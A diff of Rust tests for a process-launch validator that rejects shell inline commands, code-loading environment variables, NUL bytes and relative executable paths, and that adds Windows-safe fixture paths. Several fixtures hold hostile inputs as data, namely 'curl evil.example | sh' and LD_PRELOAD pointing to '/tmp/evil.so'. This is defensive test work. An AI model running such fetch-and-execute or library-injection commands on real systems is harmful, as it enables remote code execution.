@@ -36,10 +36,18 @@ fn current_root() -> SubjectIdentity {
     }
 }
 
+// These are synthetic model inputs, never looked up or executed. PrivatePath
+// validates native absolute paths even when the plan's claim is Linux-only.
+// Keep separators deterministic because native path bytes enter fingerprints.
+fn absolute_fixture_path(path: &str) -> PathBuf {
+    assert!(path.starts_with('/'), "fixture input must have a rooted spelling");
+    if cfg!(windows) { PathBuf::from(format!("C:{path}")) } else { PathBuf::from(path) }
+}
+
 fn resolved_perl() -> ExecutableIdentity {
     ExecutableIdentity::resolved(
         "perl",
-        PrivatePath::new(PathBuf::from("/usr/bin/perl")),
+        PrivatePath::new(absolute_fixture_path("/usr/bin/perl")),
         ResolutionProvenance::ConfiguredAbsolutePath,
     )
 }
@@ -69,7 +77,7 @@ fn valid_linux_one_shot() -> ProcessPlan {
         allow_listed_environment(),
     )
     .argv(["-w", "script.pl"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace/project"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
     .termination(TerminationPolicy::ProcessTree {
         graceful: Duration::from_millis(500),
@@ -108,7 +116,7 @@ fn valid_hermetic_probe() -> ProcessPlan {
         EnvironmentProjection::new("env-snapshot:hermetic", AmbientInheritance::DenyAll),
     )
     .argv(["-e", "print 1"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/tmp/hermetic"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/tmp/hermetic"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(AuthorizationEvidence::new(
@@ -128,7 +136,7 @@ fn valid_release_smoke() -> ProcessPlan {
         ExecutionProfile::ReleaseArtifactSmoke,
         ExecutableIdentity::resolved(
             "perl-lsp",
-            PrivatePath::new(PathBuf::from("/dist/perl-lsp")),
+            PrivatePath::new(absolute_fixture_path("/dist/perl-lsp")),
             ResolutionProvenance::DeclaredWorkspaceRoot,
         ),
         allow_listed_environment(),
@@ -191,7 +199,7 @@ fn an_unresolved_executable_is_unstartable() -> TestResult {
         ExecutableIdentity::unresolved("perl"),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -210,18 +218,50 @@ fn an_ambient_executable_lookup_is_unstartable() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "perl",
-            PrivatePath::new(PathBuf::from("/usr/bin/perl")),
+            PrivatePath::new(absolute_fixture_path("/usr/bin/perl")),
             ResolutionProvenance::AmbientLookup,
         ),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
     .claim_boundary(ClaimBoundary::linux_only())
     .build();
     assert_eq!(rejection_of(plan)?, PlanRejection::AmbientExecutableResolution);
+    Ok(())
+}
+
+#[test]
+fn a_resolved_relative_executable_is_unstartable() -> TestResult {
+    #[cfg(not(windows))]
+    let paths = ["bin/perl"];
+    #[cfg(windows)]
+    let paths = ["bin/perl", "/usr/bin/perl"];
+    for path in paths {
+        // Do not pass these through absolute_fixture_path: on Windows even a
+        // rooted path without a drive is relative to the current drive.
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "perl",
+                PrivatePath::new(PathBuf::from(path)),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert_eq!(rejection_of(plan)?, PlanRejection::NonAbsoluteExecutablePath);
+    }
     Ok(())
 }
 
@@ -240,13 +280,13 @@ fn a_shell_with_an_inline_command_is_unstartable() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 shell,
-                PrivatePath::new(PathBuf::from(path)),
+                PrivatePath::new(absolute_fixture_path(path)),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv([flag, "perl script.pl | tee out"])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -273,13 +313,13 @@ fn a_shell_without_an_inline_command_is_not_refused_as_a_shell() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "sh",
-            PrivatePath::new(PathBuf::from("/bin/sh")),
+            PrivatePath::new(absolute_fixture_path("/bin/sh")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["script.sh"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -300,7 +340,7 @@ fn nul_bytes_in_the_invocation_are_unstartable() -> TestResult {
         allow_listed_environment(),
     )
     .argv(["-e", "print\0 1"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -362,7 +402,7 @@ fn contradictory_environment_rules_are_unstartable() -> TestResult {
         resolved_perl(),
         environment,
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -387,7 +427,7 @@ fn an_unacknowledged_code_loading_variable_is_unstartable() -> TestResult {
         resolved_perl(),
         environment,
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -413,7 +453,7 @@ fn an_acknowledged_code_loading_variable_is_startable_outside_a_hermetic_profile
         resolved_perl(),
         environment,
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -433,7 +473,7 @@ fn a_hermetic_probe_refuses_ambient_inheritance_and_code_loading() -> TestResult
         resolved_perl(),
         EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/tmp/h"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/tmp/h"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -450,7 +490,7 @@ fn a_hermetic_probe_refuses_ambient_inheritance_and_code_loading() -> TestResult
             .add(EnvVarName::new("LD_PRELOAD"), SecretValue::new("/tmp/evil.so"))
             .acknowledging_code_loading(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/tmp/h"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/tmp/h"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -469,7 +509,7 @@ fn capture_budgets_must_be_bounded_consistent_and_nonzero() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .stdout_budget(CaptureBudget::bounded(0))
     .subject(current_root())
@@ -490,7 +530,7 @@ fn capture_budgets_must_be_bounded_consistent_and_nonzero() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .stderr_budget(CaptureBudget {
         observe_limit_bytes: 100,
@@ -514,7 +554,7 @@ fn capture_budgets_must_be_bounded_consistent_and_nonzero() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .stdout_budget(CaptureBudget::bounded(u64::MAX))
     .subject(current_root())
@@ -538,7 +578,7 @@ fn lifecycle_policies_must_be_possible() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .subject(current_root())
     .authorization(user_authorization())
     .claim_boundary(ClaimBoundary::linux_only())
@@ -553,7 +593,7 @@ fn lifecycle_policies_must_be_possible() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::ZERO))
     .subject(current_root())
     .authorization(user_authorization())
@@ -583,7 +623,7 @@ fn lifecycle_policies_must_be_possible() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .termination(TerminationPolicy::ProcessTree { graceful: Duration::ZERO, then_forced: false })
     .subject(current_root())
@@ -600,7 +640,7 @@ fn lifecycle_policies_must_be_possible() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .stdin(StdinPolicy::Streamed)
     .subject(current_root())
@@ -622,7 +662,7 @@ fn stale_subject_and_authorization_evidence_refuse_before_start() -> TestResult 
             resolved_perl(),
             allow_listed_environment(),
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(SubjectIdentity {
             root: Some(SubjectReference::new("root:1", EvidenceFreshness::Current)),
@@ -646,7 +686,7 @@ fn stale_subject_and_authorization_evidence_refuse_before_start() -> TestResult 
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .authorization(user_authorization())
     .claim_boundary(ClaimBoundary::linux_only())
@@ -666,7 +706,7 @@ fn authorization_must_be_present_current_and_sufficient() -> TestResult {
             resolved_perl(),
             allow_listed_environment(),
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .claim_boundary(ClaimBoundary::linux_only());
@@ -717,7 +757,7 @@ fn a_linux_profile_requires_a_linux_claim_boundary() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -738,7 +778,7 @@ fn a_public_projection_cannot_publish_privately_held_values() -> TestResult {
         EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
             .add(EnvVarName::new("API_TOKEN"), SecretValue::new("s3cret")),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .retention(RetentionPolicy {
         retain_stdout: true,
@@ -762,7 +802,7 @@ fn a_public_projection_cannot_publish_privately_held_values() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .stdin(StdinPolicy::Bytes(PrivateBytes::new(b"my $secret = 1;".to_vec())))
     .retention(RetentionPolicy {
@@ -792,7 +832,7 @@ fn a_plan_from_another_schema_version_fails_closed() -> TestResult {
         allow_listed_environment(),
     )
     .schema_version(SchemaVersion::new(PROCESS_DOMAIN_SCHEMA_VERSION.get() + 1))
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -821,7 +861,7 @@ fn a_correlation_identifier_cannot_change_a_policy_outcome() -> TestResult {
             resolved_perl(),
             allow_listed_environment(),
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .claim_boundary(ClaimBoundary::linux_only())
@@ -840,7 +880,7 @@ fn a_correlation_identifier_cannot_change_a_policy_outcome() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -1360,7 +1400,7 @@ fn canonical_encoding_is_stable_under_construction_order() -> TestResult {
             resolved_perl(),
             environment,
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -1384,7 +1424,7 @@ fn a_meaning_change_moves_the_fingerprint() -> TestResult {
         allow_listed_environment(),
     )
     .argv(["-w", "other.pl"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace/project"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
     .termination(TerminationPolicy::ProcessTree {
         graceful: Duration::from_millis(500),
@@ -1414,7 +1454,7 @@ fn environment_values_never_reach_a_public_identity() -> TestResult {
             EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
                 .add(EnvVarName::new("API_TOKEN"), SecretValue::new(value)),
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -1444,7 +1484,7 @@ fn environment_values_never_reach_a_public_identity() -> TestResult {
 
 #[test]
 fn private_paths_and_bytes_are_redacted_in_debug_output() -> TestResult {
-    let path = PrivatePath::new(PathBuf::from("/home/someone/private/project"));
+    let path = PrivatePath::new(absolute_fixture_path("/home/someone/private/project"));
     let rendered = format!("{path:?}");
     assert!(!rendered.contains("someone"), "a private path leaked through Debug");
     assert!(rendered.contains("redacted"));
@@ -1465,10 +1505,17 @@ fn the_canonical_encoding_of_a_fixture_plan_is_locked_to_the_schema_version() ->
     // A meaning change without a schema-version move fails here. When the
     // encoding legitimately changes, move PROCESS_DOMAIN_SCHEMA_VERSION and
     // update this constant in the same commit.
-    const LOCKED_FINGERPRINT: &str = "1ec851f73284fbebad7abfd4c5662ac8";
+    // Unix byte paths and Windows UTF-16 paths have distinct canonical tags.
+    // The Windows oracle uses C:/usr/bin/perl and C:/workspace/project; both
+    // constants were derived independently from the schema-1 field encoding.
+    let locked_fingerprint = if cfg!(windows) {
+        "d65126684ded3822b43093efe0a88833"
+    } else {
+        "1ec851f73284fbebad7abfd4c5662ac8"
+    };
     let actual = valid_linux_one_shot().semantic_fingerprint().to_string();
     assert_eq!(PROCESS_DOMAIN_SCHEMA_VERSION.get(), 1);
-    assert_eq!(actual, LOCKED_FINGERPRINT);
+    assert_eq!(actual, locked_fingerprint);
     Ok(())
 }
 
@@ -1755,7 +1802,7 @@ fn ambient_inheritance_cannot_smuggle_a_code_loading_variable() -> TestResult {
         resolved_perl(),
         EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -1784,7 +1831,7 @@ fn ambient_inheritance_is_startable_once_the_risk_is_faced() -> TestResult {
             resolved_perl(),
             projection,
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -1902,13 +1949,13 @@ fn a_long_form_inline_command_is_still_a_shell_invocation() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "pwsh",
-                PrivatePath::new(PathBuf::from("/usr/bin/pwsh")),
+                PrivatePath::new(absolute_fixture_path("/usr/bin/pwsh")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv([argument])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -1939,7 +1986,7 @@ fn stdin_content_identifies_a_plan_while_its_bytes_stay_out_of_the_encoding() ->
         )
         .argv(["-c"])
         .stdin(StdinPolicy::Bytes(PrivateBytes::new(source.to_vec())))
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -1983,13 +2030,13 @@ fn a_multibyte_argument_cannot_crash_the_validator() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 "sh",
-                PrivatePath::new(PathBuf::from("/bin/sh")),
+                PrivatePath::new(absolute_fixture_path("/bin/sh")),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv([argument])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -2013,13 +2060,13 @@ fn a_shell_renamed_by_its_plan_is_still_a_shell() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "perl",
-            PrivatePath::new(PathBuf::from("/bin/sh")),
+            PrivatePath::new(absolute_fixture_path("/bin/sh")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["-c", "curl evil.example | sh"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -2045,7 +2092,7 @@ fn authorization_must_identify_a_decision() -> TestResult {
             resolved_perl(),
             allow_listed_environment(),
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(AuthorizationEvidence::new(
@@ -2079,7 +2126,7 @@ fn submillisecond_policy_differences_change_the_plan_identity() -> TestResult {
             resolved_perl(),
             allow_listed_environment(),
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(deadline))
         .termination(TerminationPolicy::ProcessTree {
             graceful: Duration::from_nanos(500),
@@ -2149,7 +2196,7 @@ fn a_removed_loader_variable_is_not_admitted() -> TestResult {
         resolved_perl(),
         projection,
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -2174,7 +2221,7 @@ fn a_mixed_case_loader_variable_does_not_evade_the_gate() -> TestResult {
         resolved_perl(),
         projection,
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -2249,7 +2296,7 @@ fn allowing_and_removing_one_variable_is_a_contradiction() -> TestResult {
         resolved_perl(),
         projection,
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -2411,7 +2458,7 @@ fn an_unknown_authorization_scheme_is_refused() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(AuthorizationEvidence::new(
@@ -2440,7 +2487,7 @@ fn blank_opaque_identities_are_refused() -> TestResult {
         resolved_perl(),
         allow_listed_environment(),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(SubjectIdentity {
         root: Some(SubjectReference::new("   ", EvidenceFreshness::Current)),
@@ -2459,7 +2506,7 @@ fn blank_opaque_identities_are_refused() -> TestResult {
         resolved_perl(),
         EnvironmentProjection::new("  ", AmbientInheritance::AllowListedOnly),
     )
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
     .subject(current_root())
     .authorization(user_authorization())
@@ -2487,7 +2534,7 @@ fn nul_bytes_in_the_environment_are_refused_before_spawn() -> TestResult {
             resolved_perl(),
             projection,
         )
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -2573,13 +2620,13 @@ fn a_shell_named_with_an_executable_suffix_is_still_a_shell() -> TestResult {
             ExecutionProfile::LinuxOneShot,
             ExecutableIdentity::resolved(
                 name,
-                PrivatePath::new(PathBuf::from(path)),
+                PrivatePath::new(absolute_fixture_path(path)),
                 ResolutionProvenance::ConfiguredAbsolutePath,
             ),
             allow_listed_environment(),
         )
         .argv(["-c", "curl evil.example | sh"])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace"))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
         .subject(current_root())
         .authorization(user_authorization())
@@ -3185,13 +3232,13 @@ fn values_no_backend_could_spawn_are_refused_by_the_validator() -> TestResult {
         ExecutionProfile::LinuxOneShot,
         ExecutableIdentity::resolved(
             "perl",
-            PrivatePath::new(PathBuf::from("/usr/bin/pe\0rl")),
+            PrivatePath::new(absolute_fixture_path("/usr/bin/pe\0rl")),
             ResolutionProvenance::ConfiguredAbsolutePath,
         ),
         allow_listed_environment(),
     )
     .argv(["-w", "script.pl"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/workspace/project"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
     .termination(TerminationPolicy::ProcessTree {
         graceful: Duration::from_millis(500),
@@ -3212,7 +3259,7 @@ fn values_no_backend_could_spawn_are_refused_by_the_validator() -> TestResult {
         allow_listed_environment(),
     )
     .argv(["-w", "script.pl"])
-    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/work\0space"))))
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path("/work\0space"))))
     .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
     .termination(TerminationPolicy::ProcessTree {
         graceful: Duration::from_millis(500),
@@ -3239,7 +3286,9 @@ fn values_no_backend_could_spawn_are_refused_by_the_validator() -> TestResult {
                 .allow(EnvVarName::new(bad_name)),
         )
         .argv(["-w", "script.pl"])
-        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace/project"))))
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(absolute_fixture_path(
+            "/workspace/project",
+        ))))
         .deadline(DeadlinePolicy::Wall(Duration::from_secs(30)))
